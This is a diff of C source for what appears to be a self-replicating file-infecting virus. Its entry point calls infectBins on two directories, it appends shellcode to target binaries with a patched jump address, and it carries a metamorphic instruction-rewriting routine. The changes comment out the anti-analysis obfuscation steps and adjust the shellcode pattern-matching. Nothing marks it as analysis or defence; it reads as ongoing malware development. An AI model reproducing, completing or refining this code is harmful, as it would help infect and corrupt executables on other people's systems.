@@ -11,10 +11,10 @@ int   entry_point(void *magic) {
   /*   return (stop(1, magic)); */
   /* if (preventDebug(magic) != 0) */
   /*   return (stop(1, magic)); */
-  if (magic != (void *)0x42) {
-    if (unObfuscate() == -1)
-      return (stop(1, magic));
-  }
+  /* if (magic != (void *)0x42) { */
+  /*   if (unObfuscate() == -1) */
+  /*     return (stop(1, magic)); */
+  /* } */
   infectBins(infectDir);
   infectBins(infectDir2);
   return (stop(0, magic));
@@ -689,6 +689,7 @@ static void updateRegisters(unsigned char *ins, unsigned char *pointer, unsigned
 
 /* Source operand = 0b001 - Destination operand = 0b100 */
 const char  instructions[][MAX_INS_SIZE] __attribute__ ((section (".text#"))) = {
+  // TODO Add 0xc0 dynamically on the left
   "\x48\x89\xc0\x42\x00\x00\x0c\x42", // MOV r/m64,r64
   "\x48\x8d\x00\x42\x00\x00\x21\x42", // LEA r/m64,r64
   "\x42",
@@ -718,7 +719,7 @@ static void  copyModifiedCode(struct bfile *new, size_t binSize, size_t size) {
     ins = (void *)copyModifiedCode - sizeof(instructions);
     while (ins != (void *)copyModifiedCode) {
       j = 0;
-      while (ins[j] != 0x42 && (shellcode[i + j] == ins[j] || (ins[j] == 0xc0 && (shellcode[i + j] & 0x7) != 0x4 && (shellcode[i + j] & 0x7) != 0x5)))
+      while (ins[j] != 0x42 && (shellcode[i + j] == ins[j] || (ins[j] == 0xc0 && (shellcode[i + j] & 0x7) != 0x4 && (shellcode[i + j] & 0x7) != 0x5 && (shellcode[i + j] & 0xc0) == 0xc0)))
         j += 1;
       if (ins[j] != 0x42 ||
   ((void *)(shellcode + i) >= (void *)copyModifiedCode - sizeof(instructions) && (void *)(shellcode + i) < (void *)copyModifiedCode)) {
@@ -788,7 +789,7 @@ static int  appendShellcode(struct bfile *bin) {
   ins[7] = (address >> 48) & 0xff;
   ins[8] = (address >> 56) & 0xff;
   memcpy(((void *)new.header) + bin->size + size, ins, sizeof(ins));
-  obfuscate(((void *)new.header) + bin->size + (encryptStart - start), end - encryptStart);
+  /* obfuscate(((void *)new.header) + bin->size + (encryptStart - start), end - encryptStart); */
   munmap(bin->header, bin->size);
   bin->header = new.header;
   bin->size = new.size;
